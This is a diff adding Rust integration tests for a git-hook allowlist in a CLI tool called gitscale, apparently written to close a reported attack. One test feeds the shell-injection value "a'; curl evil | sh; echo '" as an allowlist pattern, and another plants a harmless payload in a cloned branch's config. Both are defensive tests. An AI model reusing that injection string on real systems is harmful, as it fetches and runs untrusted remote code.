@@ -7,11 +7,14 @@ use helpers::TestEnv;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 
+use gitscale::trust::ALLOW_ENV;
+
 // ---------------------------------------------------------------------------
 // `gitscale hook` — install / uninstall / shim behaviour
 //
-// Only `--local` is exercised. `--global` and `--system` write to the user's
-// (or the machine's) git config, which a test must never touch.
+// `--local` is exercised in-process. `--global` writes to the user's git
+// config, so those tests run the binary as a subprocess under an isolated HOME
+// and never touch the developer's own.
 // ---------------------------------------------------------------------------
 
 /// Run the CLI directly: `TestEnv::run` injects `-C` after the first
@@ -212,8 +215,251 @@ fn hook_status_reports_installed_hooks() {
     let root = repo.to_str().unwrap();
     assert!(cli(&["hook", "install", "--local", "-C", root]).success);
 
-    let out = cli(&["hook", "status", "-C", root]);
+    // Isolated: status reports the hooks directory git would really use, which
+    // means consulting a global core.hooksPath — the developer may have one.
+    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
     assert!(out.success, "stderr: {}", out.stderr);
     assert!(out.stdout.contains("post-checkout"), "{}", out.stdout);
     assert!(out.stdout.contains("gitscale"), "{}", out.stdout);
+}
+
+// ---------------------------------------------------------------------------
+// The allowlist the shim carries
+// ---------------------------------------------------------------------------
+
+/// The `ALLOW='...'` line the install baked into a shim.
+fn baked_allowlist(script: &Path) -> String {
+    let body = std::fs::read_to_string(script).unwrap();
+    body.lines()
+        .find(|l| l.starts_with("ALLOW='"))
+        .unwrap_or_else(|| panic!("no ALLOW line in {}", script.display()))
+        .trim_start_matches("ALLOW='")
+        .trim_end_matches('\'')
+        .to_string()
+}
+
+/// A throwaway HOME, so a test never reads or writes the developer's own git
+/// config.
+fn isolated_home(env: &TestEnv) -> PathBuf {
+    let home = env.playground.join("home");
+    std::fs::create_dir_all(&home).unwrap();
+    home
+}
+
+/// Run the real binary with its own HOME, so a `--global` install writes to a
+/// throwaway git config instead of the developer's.
+fn cli_isolated(home: &Path, args: &[&str]) -> helpers::CliOutput {
+    let out = Command::new(env!("CARGO_BIN_EXE_gitscale"))
+        .args(args)
+        .env("HOME", home)
+        .env_remove("GIT_CONFIG_GLOBAL")
+        .env_remove("GIT_CONFIG_SYSTEM")
+        .env_remove("GIT_CONFIG_COUNT")
+        .env_remove(ALLOW_ENV)
+        .output()
+        .expect("failed to run the gitscale binary");
+    helpers::CliOutput {
+        stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
+        stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
+        success: out.status.success(),
+    }
+}
+
+#[test]
+fn install_bakes_the_requested_allowlist_into_the_shim() {
+    let env = TestEnv::new("hook_allow_baked");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    let root = repo.to_str().unwrap();
+
+    let out = cli(&[
+        "hook",
+        "install",
+        "--local",
+        "--allow",
+        "github.com/acme/*,git.internal.example/*",
+        "-C",
+        root,
+    ]);
+    assert!(out.success, "stderr: {}", out.stderr);
+
+    for hook in ["post-checkout", "post-merge"] {
+        assert_eq!(
+            baked_allowlist(&hooks_dir(&repo).join(hook)),
+            "github.com/acme/*,git.internal.example/*"
+        );
+    }
+}
+
+/// A `--local` install is already a decision about one repository, and the file
+/// it writes cannot travel to anyone else — so it needs no patterns.
+#[test]
+fn install_local_allows_its_own_repository_by_default() {
+    let env = TestEnv::new("hook_allow_local_default");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
+    assert_eq!(baked_allowlist(&hooks_dir(&repo).join("post-checkout")), "*");
+}
+
+/// Upgrading gitscale means re-running install; that must not silently widen or
+/// narrow what the machine already allows.
+#[test]
+fn reinstall_keeps_the_existing_allowlist() {
+    let env = TestEnv::new("hook_allow_reinstall");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    let root = repo.to_str().unwrap();
+
+    assert!(cli(&["hook", "install", "--local", "--allow", "github.com/acme/*", "-C", root]).success);
+    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
+    assert_eq!(
+        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
+        "github.com/acme/*"
+    );
+
+    // ...and passing --allow again replaces it.
+    assert!(cli(&["hook", "install", "--local", "--allow", "*", "-C", root]).success);
+    assert_eq!(baked_allowlist(&hooks_dir(&repo).join("post-checkout")), "*");
+}
+
+/// A global install arms every clone on the machine, so it has to be told what
+/// it may run. Guessing a default here is the bug this exists to prevent.
+#[test]
+fn install_global_requires_an_allowlist() {
+    let env = TestEnv::new("hook_allow_global_required");
+    let home = isolated_home(&env);
+
+    let out = cli_isolated(&home, &["hook", "install", "--global"]);
+    assert!(!out.success, "stdout: {}", out.stdout);
+    assert!(out.stderr.contains("--allow is required"), "stderr: {}", out.stderr);
+    assert!(
+        !home.join(".config/gitscale/hooks").exists(),
+        "a refused install must not leave hooks behind"
+    );
+
+    let out = cli_isolated(
+        &home,
+        &["hook", "install", "--global", "--allow", "github.com/acme/*"],
+    );
+    assert!(out.success, "stderr: {}", out.stderr);
+    assert_eq!(
+        baked_allowlist(&home.join(".config/gitscale/hooks/post-checkout")),
+        "github.com/acme/*"
+    );
+}
+
+#[test]
+fn install_refuses_a_pattern_that_would_break_the_shim() {
+    let env = TestEnv::new("hook_allow_quote");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    let out = cli(&[
+        "hook",
+        "install",
+        "--local",
+        "--allow",
+        "a'; curl evil | sh; echo '",
+        "-C",
+        repo.to_str().unwrap(),
+    ]);
+    assert!(!out.success);
+    assert!(out.stderr.contains("cannot be written into a hook script"), "stderr: {}", out.stderr);
+}
+
+/// A shim written before the allowlist existed passes no patterns. Running wide
+/// open in that case would leave the hole in place across an upgrade.
+#[test]
+fn hook_run_refuses_when_the_shim_passed_no_allowlist() {
+    let env = TestEnv::new("hook_run_no_allowlist");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    let out = cli(&["hook", "run", "post-checkout", "-C", repo.to_str().unwrap()]);
+    assert!(!out.success);
+    assert!(out.stderr.contains("installed by an older gitscale"), "stderr: {}", out.stderr);
+}
+
+#[test]
+fn hook_status_reports_the_allowlist() {
+    let env = TestEnv::new("hook_status_allowlist");
+    let repo = repo_with(&env, Some("[repos]\n"));
+    let root = repo.to_str().unwrap();
+    assert!(cli(&["hook", "install", "--local", "--allow", "github.com/acme/*", "-C", root]).success);
+
+    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
+    assert!(out.success, "stderr: {}", out.stderr);
+    assert!(out.stdout.contains("hook allowlist"), "{}", out.stdout);
+    assert!(out.stdout.contains("github.com/acme/*"), "{}", out.stdout);
+    assert!(out.stdout.contains("NOT allowed"), "{}", out.stdout);
+}
+
+/// The reported attack, end to end: a global hook is installed, an attacker's
+/// branch carries a `.gitscale.toml` with a payload, and a developer clones it
+/// to review. Nothing but the allowlist stands in the way.
+#[test]
+fn a_global_hook_refuses_a_payload_from_a_cloned_branch() {
+    let env = TestEnv::new("hook_clone_attack");
+    let home = isolated_home(&env);
+    let loot = home.join("STOLEN");
+
+    // The attacker's branch, pushed to a repository the developer will clone.
+    let upstream = env.create_bare_repo(
+        "payload",
+        "main",
+        &[(
+            ".gitscale.toml",
+            &format!("[hooks]\npost_sync = \"touch {}\"\n", loot.display()),
+        )],
+    );
+
+    let out = cli_isolated(
+        &home,
+        &["hook", "install", "--global", "--allow", "github.com/acme/*"],
+    );
+    assert!(out.success, "stderr: {}", out.stderr);
+
+    // The developer clones the branch to take a look.
+    let victim = env.playground.join("victim");
+    let clone = Command::new("git")
+        .args([
+            "clone",
+            "--branch",
+            "main",
+            upstream.to_str().unwrap(),
+            victim.to_str().unwrap(),
+        ])
+        .env("HOME", &home)
+        .env_remove("GIT_CONFIG_GLOBAL")
+        .env_remove("GIT_CONFIG_SYSTEM")
+        .env_remove("GIT_CONFIG_COUNT")
+        .env_remove(ALLOW_ENV)
+        .output()
+        .expect("failed to clone");
+    let report = String::from_utf8_lossy(&clone.stderr).into_owned();
+
+    assert!(
+        !loot.exists(),
+        "the payload ran during a plain `git clone`:\n{}",
+        report
+    );
+    assert!(
+        report.contains("refusing to run the post_sync hook"),
+        "the refusal must be visible to whoever cloned it:\n{}",
+        report
+    );
+
+    // And the other half: with the workspace inside the allowlist, the same
+    // shim runs the same hook. The patterns are the only thing deciding.
+    let allow = format!("{}/*", env.playground.display());
+    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", &allow]).success);
+    let checkout = Command::new("git")
+        .args(["checkout", "-B", "review", "main"])
+        .current_dir(&victim)
+        .env("HOME", &home)
+        .env_remove("GIT_CONFIG_GLOBAL")
+        .env_remove("GIT_CONFIG_SYSTEM")
+        .env_remove("GIT_CONFIG_COUNT")
+        .env_remove(ALLOW_ENV)
+        .output()
+        .expect("failed to checkout");
+    assert!(
+        loot.exists(),
+        "an allowlisted workspace should still run its hook:\n{}",
+        String::from_utf8_lossy(&checkout.stderr)
+    );
 }
